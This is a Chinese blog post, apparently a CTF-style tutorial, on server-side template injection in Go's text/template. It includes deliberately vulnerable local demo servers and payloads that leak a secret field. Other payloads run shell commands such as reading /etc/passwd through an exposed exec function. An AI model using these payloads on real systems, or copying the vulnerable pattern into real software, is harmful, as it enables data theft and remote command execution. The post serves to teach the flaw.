---
title: "Go下template的SSTI分析"
description: "深入分析Go语言template模板引擎的SSTI（服务器端模板注入）漏洞，包括html/template和text/template的语法特性及安全利用技术。"
date: 2025-07-23
tags:
  - "Go"
  - "bx"
  - "ctf"
  - "WEB"
authors:
  - "bx"
draft: false             
slug: "bx1go"          
---

<meta name="referrer" content="no-referrer">


# Go下template的SSTI分析
## 基本认识
Go 标准库中提供的 `html/template` 和 `text/template` 两种模板引擎

### 具体语法
这里主要是记录一下📝

支持模板语法，比如：

+ `{{ . }}`：当前上下文
+ `{{ .Field }}`：访问字段
+ `{{ if }}{{ else }}{{ end }}`：条件
+ `{{ range }}{{ end }}`：循环
+ `{{ define }}` 和 `{{ template }}`：模板嵌套

#### 数据求值
1. 访问字段: `{{ .FieldName }}`

如果 `.` 是一个结构体或指向结构体的指针，这会访问其名为 `FieldName` 的导出字段（首字母大写）。

1. 访问嵌套字段: `{{ .StructField.NestedField }}`
2. 访问 Map 中的值:

`{{ .MapName "keyName" }}` （如果 Map 的 key 是字符串）

`{{ index .MapName $keyVariable }}` (使用 `index` 内建函数，更通用)

1. 访问 Slice 或 Array 中的元素:

`{{ .SliceName 0 }}` （Go 1.11+ 支持直接索引）

`{{ index .SliceName $indexVariable }}` (使用 `index` 内建函数)

1. 方法调用: `{{ .MethodName arg1 arg2 }}`

可以调用当前对象 `.` 上的方法。

方法必须只有一个返回值，或者有两个返回值且第二个是 `error` 类型。模板会自动检查 error，如果非 nil 则中断执行。

这个常试一试

1. 根数据对象: 在模板的顶层，`.` 通常指向 `Execute` 方法传入的整个数据对象。

#### 控制结构
`{{ if pipeline }}` ... `{{ end }}`

`{{ if pipeline }}` ... `{{ else }}` ... `{{ end }}`

`{{ if pipeline1 }}` ... `{{ else if pipeline2 }}` ... `{{ else }}` ... `{{ end }}`

`{{ range $index, $element := pipeline }}` ... `{{ end }}` (用于 Slice/Array)

`{{ range $key, $value := pipeline }}` ... `{{ end }}` (用于 Map)

`{{ range pipeline }}` ... `{{ else }}` ... `{{ end }}`

`{{ with pipeline }}` ... `{{ end }}`

+ 在 `with` 块内，`.` 变成了 `pipeline` 的结果。

`{{ with pipeline }}` ... `{{ else }}` ... `{{ end }}`

+ 如果 `pipeline` 的结果为 `false`（按 `if` 的规则），则执行 `else` 部分。

#### Others
1. 还可以用管道符号
2. 调用预定义的内置函数或开发者通过 `template.Funcs()` 注册的自定义函数

### 两个引擎对比
`html/template`

内置 **自动转义机制**，防止 XSS 攻击

支持模板继承、布局等 Web 模板功能

提供 `template.HTML`, `template.URL`, `template.JS` 等类型来显式声明不需要转义的内容（谨慎使用）

实例如下

```go
package main

import (
    "html/template"
    "os"
)

func main() {
    tmpl := `<h1>Hello, {{ .Name }}</h1>`
    data := map[string]string{"Name": "<script>alert('Go Go Go!!')</script>"}

    t := template.Must(template.New("web").Parse(tmpl))
    t.Execute(os.Stdout, data)
}
```

输出结果，实现了转义

```xml
<h1>Hello, &lt;script&gt;alert(&#39;Go Go Go!!&#39;)&lt;/script&gt;</h1>
```

`text/template`

Go 的 `text/template` 主要用于生成**纯文本**输出，例如配置文件、电子邮件、源代码、普通文本消息等。与主要用于生成 HTML 的 `html/template` 不同，`text/template`**不具备**上下文感知和自动转义功能。这意味着它不会根据输出的位置（如 HTML 标签、属性、JavaScript 脚本等）自动进行安全处理。

示例如下

```go
package main

import (
    "os"
    "text/template"
)

func main() {
    // 构建模板
    tmpl, err := template.New("").Parse("Hello，{{ . }}")
    if err != nil {
       panic(err)
    }

    err = tmpl.Execute(os.Stdout, "Bpple")
    if err != nil {
       panic(err)
    }
}
```

![](https://cdn.nlark.com/yuque/0/2025/png/42994824/1745219006661-a5920ac8-559b-4cc1-986e-ca11c3267452.png)

## 🌟Attack
### 模板注入
这个主要可以帮助我们获取一下变量值等信息

整理了一个实例，可以运行比较测试一下

```go
package main

import (
    "fmt"
    "html"
    "log"
    "net/http"
    "text/template"
)

// 模拟一些应用数据，其中包含敏感信息
var appData = struct {
    AdminNote string
    SecretKey string
}{
    AdminNote: "System is running smoothly.",
    SecretKey: "Flag{1234567890abcdef}",
}

func main() {
    http.HandleFunc("/vulnerable", func(w http.ResponseWriter, r *http.Request) {
       // 从查询参数获取 'format'
       format := r.URL.Query().Get("format")
       if format == "" {
          format = "Welcome, user!"
       }
       templateString := format

       w.Header().Set("Content-Type", "text/plain; charset=utf-8") // 明确是纯文本
       w.WriteHeader(http.StatusOK)

       tmpl, err := template.New("vuln").Parse(templateString)
       if err != nil {
          fmt.Fprintf(w, "Template parsing error: %v\n", err)
          log.Printf("Vulnerable endpoint parse error: %v (Input: %q)", err, format)
          return
       }
       
       err = tmpl.Execute(w, appData)
       if err != nil {
          fmt.Fprintf(w, "\nTemplate execution error: %v", err)
          log.Printf("Vulnerable endpoint execute error: %v (Input: %q)", err, format)
       }
    })
    
    http.HandleFunc("/safe", func(w http.ResponseWriter, r *http.Request) {
       name := r.URL.Query().Get("name")
       if name == "" {
          name = "Guest"
       }
       templateString := "Hello, {{ .UserName }}! The admin note is: {{ .AdminNote }}"

       tmpl := template.Must(template.New("safe").Parse(templateString))
       dataForTemplate := struct {
          UserName  string
          AdminNote string

       }{
          UserName:  name,
          AdminNote: appData.AdminNote,
       }

       w.Header().Set("Content-Type", "text/plain; charset=utf-8") // 明确是纯文本
       w.WriteHeader(http.StatusOK)

       // 执行静态模板，传入包含用户数据（但没有秘密）的数据
       err := tmpl.Execute(w, dataForTemplate)
       if err != nil {
          fmt.Fprintf(w, "Template execution error: %v\n", err)
          log.Printf("Safe endpoint execute error: %v", err)
       }
    })
    
    http.HandleFunc("/safe-html-manual", func(w http.ResponseWriter, r *http.Request) {
       name := r.URL.Query().Get("name")
       if name == "" {
          name = "Guest"
       }
       
       templateString := "<h1>Hello, {{ .EscapedName }}</h1><p>Admin note: {{ .EscapedAdminNote }}</p>"
       tmpl := template.Must(template.New("safe-html").Parse(templateString))
       
       dataForTemplate := struct {
          EscapedName      string
          EscapedAdminNote string
       }{
          EscapedName:      html.EscapeString(name),            
          EscapedAdminNote: html.EscapeString(appData.AdminNote),
       }

       w.Header().Set("Content-Type", "text/html; charset=utf-8") // 输出是 HTML
       w.WriteHeader(http.StatusOK)

       err := tmpl.Execute(w, dataForTemplate)
       if err != nil {
          fmt.Fprintf(w, "Template execution error: %v\n", err)
          log.Printf("Safe HTML endpoint execute error: %v", err)
       }
    })

    fmt.Println("Starting template injection demo server on :8090...")
    fmt.Println("Endpoints:")
    fmt.Println("  Vulnerable: http://localhost:8090/vulnerable?format=<template_string>")
    fmt.Println("  Safe:       http://localhost:8090/safe?name=<user_name>")
    fmt.Println("  Safe HTML:  http://localhost:8090/safe-html-manual?name=<user_name>")
    fmt.Println("\nInjection examples for /vulnerable:")
    fmt.Println("  - Access Secret: http://localhost:8090/vulnerable?format={{.SecretKey}}")
    fmt.Println("  - List Fields:   http://localhost:8090/vulnerable?format={{.}}")
    fmt.Println("  - Execute Func:  http://localhost:8090/vulnerable?format={{printf \"Admin note is: %s\" .AdminNote}}")
    fmt.Println("  - Conditional:   http://localhost:8090/vulnerable?format={{if .SecretKey}}Secret exists!{{end}}")

    log.Fatal(http.ListenAndServe(":8090", nil))
}
```

![](https://cdn.nlark.com/yuque/0/2025/png/42994824/1745219006664-84b1a2e6-9d58-4f50-ae57-a8068e9abda1.png)

我们测试一下

```plain
vulnerable?format={{.}}
{{if .SecretKey}}Secret exists!{{end}}
```

![](https://cdn.nlark.com/yuque/0/2025/png/42994824/1745219006754-fde0962b-a885-48fd-8774-a1d7c327a044.png)

![](https://cdn.nlark.com/yuque/0/2025/png/42994824/1745219006643-e0961fda-38ec-4216-9695-98134f264422.png)

### 命令执行
我们想实现命令执行的前提是，代码环境中存在相关函数等,就是说可供我们利用

我们再调一个靶场如下

```go
package main

import (
    "fmt"
    "html"
    "log"
    "net/http"
    "os/exec"
    "text/template"
)

var appData = struct {
    AdminNote string
    SecretKey string
}{
    AdminNote: "System is running smoothly.",
    SecretKey: "Flag{1234567890abcdef}",
}

func executeCommand(command string) string {
    cmd := exec.Command("sh", "-c", command)
    output, err := cmd.CombinedOutput()
    if err != nil {
       return fmt.Sprintf("Error executing command '%s': %v\nOutput:\n%s", command, err, string(output))
    }
    return string(output)
}

func main() {
    http.HandleFunc("/vulnerable", func(w http.ResponseWriter, r *http.Request) {
       format := r.URL.Query().Get("format")
       if format == "" {
          format = "Welcome, user!"
       }

       templateString := format

       w.Header().Set("Content-Type", "text/plain; charset=utf-8")
       w.WriteHeader(http.StatusOK)

       tmpl := template.New("vuln").Funcs(template.FuncMap{
          "exec": executeCommand,
       })

       tmpl, err := tmpl.Parse(templateString)
       if err != nil {
          fmt.Fprintf(w, "Template parsing error: %v\n", err)
          log.Printf("Vulnerable endpoint parse error: %v (Input: %q)", err, format)
          return
       }

       err = tmpl.Execute(w, appData)
       if err != nil {
          fmt.Fprintf(w, "\nTemplate execution error: %v", err)
          log.Printf("Vulnerable endpoint execute error: %v (Input: %q)", err, format)
       }
    })

    http.HandleFunc("/safe", func(w http.ResponseWriter, r *http.Request) {
       name := r.URL.Query().Get("name")
       if name == "" {
          name = "Guest"
       }
       templateString := "Hello, {{ .UserName }}! The admin note is: {{ .AdminNote }}"
       tmpl := template.Must(template.New("safe").Parse(templateString))
       dataForTemplate := struct {
          UserName  string
          AdminNote string
       }{
          UserName:  name,
          AdminNote: appData.AdminNote,
       }
       w.Header().Set("Content-Type", "text/plain; charset=utf-8")
       w.WriteHeader(http.StatusOK)
       err := tmpl.Execute(w, dataForTemplate)
       if err != nil {
          fmt.Fprintf(w, "Template execution error: %v\n", err)
          log.Printf("Safe endpoint execute error: %v", err)
       }
    })

    http.HandleFunc("/safe-html-manual", func(w http.ResponseWriter, r *http.Request) {
       name := r.URL.Query().Get("name")
       if name == "" {
          name = "Guest"
       }
       templateString := "<h1>Hello, {{ .EscapedName }}</h1><p>Admin note: {{ .EscapedAdminNote }}</p>"
       tmpl := template.Must(template.New("safe-html").Parse(templateString))
       dataForTemplate := struct {
          EscapedName      string
          EscapedAdminNote string
       }{
          EscapedName:      html.EscapeString(name),
          EscapedAdminNote: html.EscapeString(appData.AdminNote),
       }
       w.Header().Set("Content-Type", "text/html; charset=utf-8")
       w.WriteHeader(http.StatusOK)
       err := tmpl.Execute(w, dataForTemplate)
       if err != nil {
          fmt.Fprintf(w, "Template execution error: %v\n", err)
          log.Printf("Safe HTML endpoint execute error: %v", err)
       }
    })

    fmt.Println("Starting template injection demo server on :8090...")
    fmt.Println("Endpoints:")
    fmt.Println("  Vulnerable: http://localhost:8090/vulnerable?format=<template_string>")
    fmt.Println("  Safe:       http://localhost:8090/safe?name=<user_name>")
    fmt.Println("  Safe HTML:  http://localhost:8090/safe-html-manual?name=<user_name>")
    fmt.Println("\nInjection examples for /vulnerable:")
    fmt.Println("  - Access Secret: http://localhost:8090/vulnerable?format={{.SecretKey}}")
    fmt.Println("  - List Fields:   http://localhost:8090/vulnerable?format={{.}}")
    fmt.Println("  - Execute Func:  http://localhost:8090/vulnerable?format={{printf \"Admin note is: %s\" .AdminNote}}")
    fmt.Println("  - Conditional:   http://localhost:8090/vulnerable?format={{if .SecretKey}}Secret exists!{{end}}")
    fmt.Println("  - !! RCE !! :    http://localhost:8090/vulnerable?format={{exec \"id\"}}")
    fmt.Println("  - !! RCE !! :    http://localhost:8090/vulnerable?format={{exec \"ls -la /\"}}")
    fmt.Println("  - !! RCE !! :    http://localhost:8090/vulnerable?format={{exec \"cat /etc/passwd\"}}")

    log.Fatal(http.ListenAndServe(":8090", nil))
}
```

**添加到 FuncMap**：在 `/vulnerable` 处理函数中，创建模板实例后，使用 `.Funcs()` 方法将 `executeCommand` 函数添加到模板的函数映射中，并将其命名为 `exec`。

然后模板中可以使用 `{{ exec "command" }}` 来调用这个函数。`.Funcs()` 必须在 `.Parse()` 之前调用。

![](https://cdn.nlark.com/yuque/0/2025/png/42994824/1745219006611-48ebe00c-1dfe-4810-b999-3220b5947c46.png)

利用效果如下

```plain
http://localhost:8090/vulnerable?format={{exec%20%22ls%20-la%20/%22}}
```

![](https://cdn.nlark.com/yuque/0/2025/png/42994824/1745219008400-fb66b1f2-8081-4816-8064-e8a3c71d0c77.png)

## 参考文章
https://xz.aliyun.com/news/15003

https://xz.aliyun.com/news/12088

